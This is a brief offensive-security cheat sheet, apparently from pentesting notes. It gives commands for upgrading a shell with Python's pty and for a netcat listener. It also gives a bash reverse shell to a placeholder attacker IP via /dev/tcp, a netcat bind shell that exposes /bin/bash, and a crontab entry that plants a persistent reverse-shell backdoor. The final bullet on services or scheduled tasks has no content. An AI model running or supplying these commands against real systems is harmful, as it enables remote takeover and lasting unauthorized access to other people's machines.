### Upgrading a shell
- Linux/Unix targets with python
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
- Set TERM to resize the terminal
```
export TERM=xterm stty rows <ROWS> cols <COLS>
```
### Reverse shells 
- Set up a listener
```
nc -nlvp <PORT>
```
- Connect to the listener
```
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```
### Create a bind shell
- If outbound connections from the target are restricted create a bind shell instead
- on the target machine
```
nc -nlvp <PORT> -e /bin/bash
```
- from the attacking machine to connect to the target
```
nc <TARGET_IP> <PORT>
```
### Drop a persistent backdoor
- For long-term nested shell reliability, create a persistent backdoor
- Cron
```
echo '* * * * * bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /etc/crontab
```
- Using a service or scheduled task